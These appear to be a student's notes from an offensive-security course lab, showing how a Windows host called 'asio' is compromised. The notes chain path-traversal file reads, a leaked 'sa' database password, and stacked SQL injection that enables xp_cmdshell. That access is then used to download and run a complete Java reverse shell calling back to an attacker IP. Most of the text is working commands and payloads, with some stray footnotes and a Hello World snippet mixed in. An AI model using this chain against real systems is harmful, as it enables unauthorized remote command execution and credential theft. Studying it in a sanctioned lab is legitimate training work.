##### ASIO

nmap scan

```
nmap asio

sudo nmap -O -Pn asio

```
Content Discovery

```
gobuster dir -u http://asio -w /usr/share/wordlists/dirb/common.txt
```
In the previous Learning Unit, we identified the /specials?menu=winter.html endpoint

We'll need to add several instances of "../" to our payload to traverse back to the base directory of the server. In Repeater, let's change "web200.html" to "../../../../../../../windows/win.ini" and click Send.

Next, let's build a list of file names. We are searching for application.properties or application.yml. Since the file could be in the current directory or a /config subdirectory, we'll add /config to our new file.

```
nano paths.txt
cat paths.txt
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```

```
nano files.txt
cat files.txt
application.properties
application.yml
config/application.properties
config/application.yml
```

```
wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z

curl http://asio/specials?menu=../config/application.properties

```

1
(Webb, Syer, et al., 2016), https://docs.spring.io/spring-boot/docs/1.4.1.RELEASE/reference/html/boot-features-external-config.html#boot-features-external-config-application-property-files ↩︎

2
(Oracle, 2021), https://docs.oracle.com/javase/tutorial/essential/environment/paths.html ↩︎

3
(Xavi Mendez, 2020), https://wfuzz.readthedocs.io/en/latest/user/getting.html#multiple-payloads ↩︎



We can verify this with a simple stacked query, such as selecting the SQL Server version.

In Repeater, let's update the id parameter to "4;SELECT @@VERSION;". We'll need to encode the space as a plus sign (+) before we click Send.

```
cat tables.txt
newsletter
newsletters
subscription
subscriptions
newsletter_subscription
newsletter_subscriptions
```

```
insert into TABLE_NAME values('EMAIL_VALUE')
```

wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=C0C3B7B39FB409EC20E31AF0B715C801 -d "" "http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"

The application.properties file contains some additional information that we will find useful.

```
spring.datasource.username=sa
spring.datasource.password=MqFuFWUGNrR3P4bJ
```
Based on the file, the application may be connecting to the database as the "sa" user. The "sa" user in SQL Server is typically the System Administrator account and has elevated permissions on the server, including the ability to change configuration settings.

Most importantly to us, if our SQL injection payloads are executed under the "sa" user, we should be able to enable and use xp_cmdshell.

First, we need a payload that enables advanced options. We can use Microsoft's documentation1 as the basis of our payload.

```
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
```
Next, we'll enable xp_cmdshell. Again, Microsoft's documentation provides the basis of our payload.

```
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

We'll start a netcat listener at port 8000.

```
kali@kali:~$ nc -nvlp 8000
listening on [any] 8000 ...
Listing 18 - Starting a netcat listener
```

Now that our listener is running, we'll update our SQL injection payload to call curl with xp_cmdshell and pass in our Kali's IP address and the port of our listener. Here's our base SQL injection payload:

```
EXEC xp_cmdshell 'curl http://192.168.48.2:8000/itworked'; 
```
1
(Microsoft, 2022), https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15 ↩︎

Java Reverse shell:

```
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Hello world:

```
class HelloWorldApp {
    public static void main(String[] args) {
        System.out.println("Hello World!"); // Display the string.
    }
}
```

```
cat RevShell.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

class RevShell {
    public static void main(String[] args) throws Exception {
        String host="192.168.48.2";
        int port=4444;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    }
}
```

Download revshell:

```
EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/RevShell.java+--output+%temp%/RevShell.java'; 
```

SQLi payload to run rev shell:

```
EXEC xp_cmdshell 'java %temp%/RevShell.java';
```

1
(Microsoft, 2007), https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:Win32/NetCat&ThreatID=2147593673 ↩︎

2
(Swissky, et al., 2022), https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#java-alternative-1 ↩︎

3
(Wikipedia, 2022), https://en.wikipedia.org/wiki/"Hello,_World!"_program ↩︎

4
(Oracle, 2021), https://docs.oracle.com/javase/tutorial/getStarted/application/index.html ↩︎

5
(Oracle, 2021), https://docs.oracle.com/javase/tutorial/essential/exceptions/index.html ↩︎

6
(Oracle, 2021), https://docs.oracle.com/javase/tutorial/essential/exceptions/catchOrDeclare.html ↩︎

7
(Oracle, 2021), https://docs.oracle.com/javase/tutorial/essential/exceptions/throwing.html ↩︎

8
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Temporary_folder ↩︎

9
(Oracle, 2022), https://openjdk.java.net/jeps/330 ↩︎



